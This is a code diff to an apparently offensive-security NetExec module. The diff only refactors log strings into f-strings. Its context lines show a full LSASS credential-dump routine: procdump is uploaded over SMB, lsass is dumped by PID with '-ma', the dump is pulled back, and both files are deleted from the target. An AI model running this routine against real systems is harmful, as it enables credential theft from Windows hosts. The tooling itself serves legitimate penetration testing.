@@ -57,21 +57,21 @@ class NXCModule:
             with open(self.procdump_path + self.procdump, "wb") as procdump:
                 procdump.write(self.procdump_embeded)
 
-        context.log.display("Copy {} to {}".format(self.procdump_path + self.procdump, self.tmp_dir))
+        context.log.display(f"Copy {self.procdump_path + self.procdump} to {self.tmp_dir}")
         with open(self.procdump_path + self.procdump, "rb") as procdump:
             try:
                 connection.conn.putFile(self.share, self.tmp_share + self.procdump, procdump.read)
-                context.log.success("Created file {} on the \\\\{}{}".format(self.procdump, self.share, self.tmp_share))
+                context.log.success(f"Created file {self.procdump} on the \\\\{self.share}{self.tmp_share}")
             except Exception as e:
                 context.log.fail(f"Error writing file to share {self.share}: {e}")
 
         # get pid lsass
         command = 'tasklist /v /fo csv | findstr /i "lsass"'
-        context.log.display("Getting lsass PID {}".format(command))
+        context.log.display(f"Getting lsass PID {command}")
         p = connection.execute(command, True)
         pid = p.split(",")[1][1:-1]
         command = self.tmp_dir + self.procdump + " -accepteula -ma " + pid + " " + self.tmp_dir + "%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp"
-        context.log.display("Executing command {}".format(command))
+        context.log.display(f"Executing command {command}")
         p = connection.execute(command, True)
         context.log.debug(p)
         dump = False
@@ -91,26 +91,26 @@ class NXCModule:
                 context.log.display("Error getting the lsass.dmp file name")
                 sys.exit(1)
 
-            context.log.display("Copy {} to host".format(machine_name))
+            context.log.display(f"Copy {machine_name} to host")
 
             with open(self.dir_result + machine_name, "wb+") as dump_file:
                 try:
                     connection.conn.getFile(self.share, self.tmp_share + machine_name, dump_file.write)
-                    context.log.success("Dumpfile of lsass.exe was transferred to {}".format(self.dir_result + machine_name))
+                    context.log.success(f"Dumpfile of lsass.exe was transferred to {self.dir_result + machine_name}")
                 except Exception as e:
-                    context.log.fail("Error while get file: {}".format(e))
+                    context.log.fail(f"Error while get file: {e}")
 
             try:
                 connection.conn.deleteFile(self.share, self.tmp_share + self.procdump)
-                context.log.success("Deleted procdump file on the {} share".format(self.share))
+                context.log.success(f"Deleted procdump file on the {self.share} share")
             except Exception as e:
-                context.log.fail("Error deleting procdump file on share {}: {}".format(self.share, e))
+                context.log.fail(f"Error deleting procdump file on share {self.share}: {e}")
 
             try:
                 connection.conn.deleteFile(self.share, self.tmp_share + machine_name)
-                context.log.success("Deleted lsass.dmp file on the {} share".format(self.share))
+                context.log.success(f"Deleted lsass.dmp file on the {self.share} share")
             except Exception as e:
-                context.log.fail("Error deleting lsass.dmp file on share {}: {}".format(self.share, e))
+                context.log.fail(f"Error deleting lsass.dmp file on share {self.share}: {e}")
 
             with open(self.dir_result + machine_name, "rb") as dump:
                 try:
